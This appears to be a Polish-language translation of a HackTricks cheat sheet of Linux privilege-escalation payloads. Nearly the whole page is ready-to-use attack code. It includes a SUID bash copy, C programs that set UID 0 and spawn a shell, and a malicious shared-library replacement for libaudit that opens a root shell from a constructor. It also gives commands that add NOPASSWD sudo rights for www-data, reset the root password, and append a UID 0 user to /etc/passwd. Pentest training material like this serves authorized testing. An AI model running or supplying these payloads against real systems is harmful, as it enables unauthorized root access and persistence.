# Payloads to execute

{{#include ../../banners/hacktricks-training.md}}

## Bash

`bash -p` włącza tryb uprzywilejowany: gdy Bash uruchamia się z różnymi rzeczywistymi i efektywnymi identyfikatorami, nie resetuje efektywnego identyfikatora do rzeczywistego identyfikatora. Wynikowa powłoka nadal zależy od istniejących poświadczeń użytkownika wywołującego.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

`setresuid` zmienia rzeczywiste, efektywne i zapisane identyfikatory, gdy jest to dozwolone, natomiast `setuid` zmienia efektywny identyfikator i może również ustawić rzeczywisty oraz zapisany identyfikator w przypadku uprzywilejowanego wywołującego. `execve` zastępuje bieżący obraz procesu żądanym programem.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> W tych przykładach pominięto sprawdzanie wartości zwracanych; oba wywołania dotyczące poświadczeń mogą zakończyć się niepowodzeniem nawet dla UID 0.<sup>[[2]](#references)[[3]](#references)</sup>
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Nadpisywanie pliku w celu eskalacji uprawnień

### Typowe pliki

Oto typowe lokalne pliki i interfejsy kontroli uprawnień: `/etc/passwd` przechowuje siedmiopolowe rekordy kont, `/etc/shadow` przechowuje opcjonalne zaszyfrowane dane haseł, `sudoers` definiuje uprawnienia sudo i tagi, takie jak `NOPASSWD`, a domyślnym endpointem demona Docker jest Unix socket pod adresem `/var/run/docker.sock`; dostęp do tego socketu może zapewnić kontrolę na poziomie root nad hostem.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Dodaj użytkownika z hasłem do _/etc/passwd_
- Zmień hasło w _/etc/shadow_
- Dodaj użytkownika do sudoers w _/etc/sudoers_
- Wykorzystaj Docker przez socket Dockera, zwykle znajdujący się w _/run/docker.sock_ lub _/var/run/docker.sock_

### Nadpisywanie biblioteki

Sprawdź, których bibliotek współdzielonych używa plik binarny; w tym przykładzie sprawdź `/bin/su` za pomocą `ldd`.<sup>[[9]](#references)</sup>
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
`ldd` zgłasza zależności shared-object, podczas gdy dynamic linker używa metadanych ELF i swoich reguł wyszukiwania, aby ładować je w czasie wykonywania.<sup>[[9]](#references)[[10]](#references)</sup>

Aby sprawdzić jednego kandydata, użyj `objdump -T`, aby wyświetlić dynamiczną tabelę symboli `su` i odfiltrować nazwy audytu.<sup>[[11]](#references)</sup>
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
`audit_open`, `audit_log_user_message` oraz `audit_log_acct_message` to funkcje libaudit; `audit_fd` jest przedstawiony w tym wyjściu jako obiekt danych zdefiniowany w sekcji `.bss` programu `su`.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> Biblioteka zastępcza musi eksportować kompatybilne definicje dla niezdefiniowanych symboli rozwiązywanych przez loader; niezgodne ABI funkcji/danych mogą mimo to spowodować awarię procesu podczas relokowania tych symboli lub wywoływania funkcji.<sup>[[10]](#references)[[11]](#references)</sup>

Atrybut `constructor` GCC powoduje, że `inject` jest automatycznie wywoływana przed `main` na obsługiwanych platformach.<sup>[[15]](#references)</sup>
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Jeśli replacement zostanie pomyślnie załadowany przez uprzywilejowany proces **`/bin/su`**, ten constructor może uruchomić **`/bin/bash`** z uprawnieniami tego procesu; dokładny rezultat zależy od środowiska.<sup>[[10]](#references)[[15]](#references)</sup>

## Skrypty

Czy możesz sprawić, by root coś wykonał?

`sudoers` używa tagu `NOPASSWD` w wpisach policy, `chpasswd` odczytuje pary `user:password` ze standardowego wejścia, a `/etc/passwd` używa siedmiu pól konta rozdzielonych dwukropkami; poniższe przykłady zakładają, że odpowiednie pliki są zapisywalne przez proces, który je wykonuje.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data to sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Zmień hasło roota**
```bash
echo "root:hacked" | chpasswd
```
### Dodaj nowego użytkownika root do /etc/passwd

Końcowy payload zależy od targetu, który akceptuje wygenerowany hash `crypt`: Debianowe `mkpasswd -m sha-512` mapuje na SHA-512 crypt (`$6$`), podczas gdy OpenSSL `passwd -1 -salt` używa algorytmu BSD opartego na MD5 (`$1$`).<sup>[[17]](#references)[[18]](#references)</sup>
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
## References

- [1] [Wbudowane polecenie set (Podręcznik referencyjny Bash)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — strona podręcznika Linux](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — strona podręcznika Linux](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — strona podręcznika Linux](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — strona podręcznika Linux](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — podręczniki Debiana](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [Ochrona socketu demona Docker](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — Dokumentacja Docker](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — strona podręcznika Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump (Narzędzia binarne GNU)](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — podręczniki Debiana](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — podręczniki Debiana](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — podręczniki Debiana](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [Wspólne atrybuty (Korzystanie z kolekcji kompilatorów GNU)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — źródła Debiana](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — Dokumentacja OpenSSL](https://docs.openssl.org/master/man1/openssl-passwd/)
{{#include ../../banners/hacktricks-training.md}}
